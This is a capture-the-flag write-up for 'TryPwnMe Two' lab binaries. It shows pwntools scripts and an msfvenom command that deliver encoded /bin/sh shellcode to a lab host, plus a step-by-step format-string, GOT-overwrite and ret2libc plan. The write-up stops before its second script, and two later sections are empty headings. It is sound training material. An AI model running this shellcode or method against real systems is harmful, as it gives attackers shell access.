# TryPwnMe Two

### TryExecMe 2
This first binary executes whatever shellcode we provide in input. <br />
![image](https://github.com/user-attachments/assets/a2bd5ffd-89d0-4fc9-b2ad-f1ab985c565c)<br />
The problem is that it calls a function called `forbidden` that checks if the shellcode is made of forbidden characters. If so, the binary prints "Forbidden spell detected!".<br />
So of course this simple script doesn't work:

    from pwn import *
    
    p = process("./tryexecme2")
    
    shellcode = shellcode = asm(shellcraft.sh())
    
    p.sendline(shellcode)
    
    p.interactive()
![image](https://github.com/user-attachments/assets/48491203-eebf-4a7b-8235-cb92ce6fe4b6)<br />
That's because `shellcraft` obviously uses some forbidden characters, otherwise it would be too easy. So I think I need to use `msfvenom`. I analyzed the binary with IDA to find what are the bad characters, and at the end I generated the payload with msfvenom: `msfvenom -p linux/x64/exec CMD=/bin/sh -b '\x80\x34\x7e\x0f\x04\xcd' -f python`.<br />
The final script to exploit the remote machine is:

    from pwn import *
    
    #p = process("./tryexecme2")
    
    ip = "10.10.136.230"
    port = 5002
    
    p = remote(ip,port)
    
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d"
    buf += b"\x05\xef\xff\xff\xff\x48\xbb\x1c\x2e\x8e\xb1\x27"
    buf += b"\x5c\x2f\xb9\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    buf += b"\xff\xe2\xf4\x54\x96\xa1\xd3\x4e\x32\x00\xca\x74"
    buf += b"\x2e\x17\xe1\x73\x03\x7d\xdf\x74\x03\xed\xe5\x79"
    buf += b"\x0e\xc7\xb1\x1c\x2e\x8e\x9e\x45\x35\x41\x96\x6f"
    buf += b"\x46\x8e\xe7\x70\x08\x71\xd3\x27\x76\x81\xb4\x27"
    buf += b"\x5c\x2f\xb9"
    
    p.sendline(buf)
    
    p.interactive()
![image](https://github.com/user-attachments/assets/16b687cf-7dfb-483b-8980-7f6e05ced814)<br />

### Not Specified 2
Checksec shows the following defense measures:<br />
![Screenshot 2025-03-25 103655](https://github.com/user-attachments/assets/193bc2cb-5209-4641-a0d1-671cac146ede)<br />
This is how IDA disassembles the binary:<br />
![image](https://github.com/user-attachments/assets/bb63c6a3-058c-4e67-9c91-652318ae4808)<br />
As you can see, the stack is 528 bytes long, but the `read` function only takes 512 bytes in input. This means that technically I can't do any buffer overflow. What I can do though is a format string exploit. <br />
How can a format string vulnerability lead to a full shell on the target system? The lack of defense mechanisms can allow it:
- Partial RELRO --> the GOT is writable during execution.
- No PIE --> the code of the binary ALWAYS starts at `0x3fe000`.
- Not Stripped --> easier to find GOT entries.
<br /><br />
The main idea of this attack is:
1) use format string to leak addresses from the stack. Inside the stack I want to find an address of a function from the libc library. Notice that I don't need to do all of this in a single execution. The stack layout is going to be the same at every execution, so I can just execute the program multiple times until I find at which offset the stack contains a libc function.
2) Once I know the offset, I can dinamically compute the base of the libc library by subtracting the known offset of the leaked function from the leaked address.
3) Since the binary is not PIE, the address of the GOT table is well known, and I can use the format string vulnerability to overwrite the entry of the `exit` function in the GOT with the address of `main`, so that I have another execution to send a second payload, while the base of the libc is still the same! you know where this is going..
4) Now I compute the addresses of `system` and and perform a ret2libc attack by overwriting the entry point of `exit` in the GOT with the address of `system`, and sending `/bin/sh` as an argument.
<br />
So let's start with the first step. After some trial end error, you'll find out that the third element of the stack contains an address from the libc:<br />
![Screenshot 2025-03-26 111122](https://github.com/user-attachments/assets/eff6f398-d4fe-4fee-bd8a-8ddb07241a09)<br />
![Screenshot 2025-03-26 111252](https://github.com/user-attachments/assets/9396ae16-db6a-4f46-8df3-84f8f1de2eae)<br />
This means that the third address of the stack is 23 bytes away from the `write()` fucntion of the libc library. Good, so now I know how to compute the address of libc.


Now I want to do a test. I want to see if I can overwrite the entrypoint of the `exit` fucntion with the address `main`, so that I can execute the program again and drop the second payload. The following script seems to do the job.



### Try a Note

### Slow Server
